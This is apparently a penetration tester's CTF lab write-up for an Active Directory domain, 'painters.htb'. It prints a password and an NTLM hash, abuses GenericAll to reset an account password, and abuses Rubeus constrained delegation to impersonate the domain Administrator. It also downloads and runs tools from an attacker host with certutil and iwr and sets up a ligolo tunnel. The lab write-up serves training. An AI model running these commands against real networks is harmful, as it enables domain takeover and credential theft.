# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 
- IP: `192.168.110.53 `

# Findings
### Credentials
`painters.htb\riley:P@ssw0rd`

### Flag
- `ZEPHYR{P3r5isT4nc3_1s_k3Y_4_M0v3men7}`
- `ZEPHYR{P41n73r_D0m41n_D0m1n4nc3}`
## External
### Enumeration
![](https://i.imgur.com/YZ8Edy7.png)

![](https://i.imgur.com/c27cdti.png)

![](https://i.imgur.com/nP2cpIr.png)
`SMB         192.168.110.53  445    PNT-SVRBPA       [+] .\james:8af1903d3c80d3552a84b6ba296db2ea (Pwn3d!)`
### Gaining Access
![](https://i.imgur.com/onc0HUP.png)
- The computer Has `genericall` over blake so, i can do this.
![](https://i.imgur.com/AH0pivZ.png)
```shell
certutil.exe -split -f -urlcache http://10.10.14.3/rexder.exe rexder.exe

PS C:\> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

PS C:\> Set-DomainUserPassword -Identity blake -AccountPassword $SecPassword
```
## Internal
### Enumeration
![](https://i.imgur.com/KAA7IV0.png)
- I did Constrain Delegation
```shell
# I checked if my User can delegate
> Get-DomainUser -TrustedToAuth

# I requested for TGT
> .\rubeus.exe asktgt /user:blake /domain:painters.htb /password:'Password123!' /outfile:pc.tgt

# I requested for Impersonated TGS -> i got the msdsspn from the 1st command.
> .\rub.exe s4u /ticket:C:\pc.tgt /msdsspn:"CIFS/dc.painters.htb" /impersonateuser:Administrator /ptt

PS C:\> klist
klist

Current LogonId is 0:0x3e7

Cached Tickets: (1)

#0>	Client: Administrator @ PAINTERS.HTB
	Server: CIFS/dc.painters.htb @ PAINTERS.HTB
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
	Start Time: 6/27/2024 15:21:49 (local)
	End Time:   6/28/2024 1:15:09 (local)
	Renew Time: 7/4/2024 15:15:09 (local)
	Session Key Type: AES-128-CTS-HMAC-SHA1-96
	Cache Flags: 0
	Kdc Called:

# i Wanted to get Winrm to the DC so i made the cifs to http
> .\rub.exe s4u /ticket:C:\pc.tgt /msdsspn:"CIFS/dc.painters.htb" /impersonateuser:Administrator /altservice:http /ptt

PS C:\> Enter-PSSession -ComputerName dc.painters.htb
Enter-PSSession -ComputerName dc.painters.htb
[dc.painters.htb]: PS C:\Users\Administrator\Documents> whoami
whoami
painters\administrator

> After this i changed the password and connected with psexec

.\ligolo-agent.exe -connect 10.10.14.3:443 -ignore-cert

```

### Gaining Access


### Maintaining Access


# Random Notes
`powershell iwr -uri http://10.10.14.3/winpeas.exe -outfile win.exe`
```
Set-DomainObject -Identity blake -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}

Get-DomainSPNTicket blake | fl

Get-ObjectAcl -SamAccountName blake -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  

t
$Cred = New-Object System.Management.Automation.PSCredential('PAINTERS\\', $SecPassword)
Set-DomainUserPassword -Identity blake -AccountPassword $SecPassword
```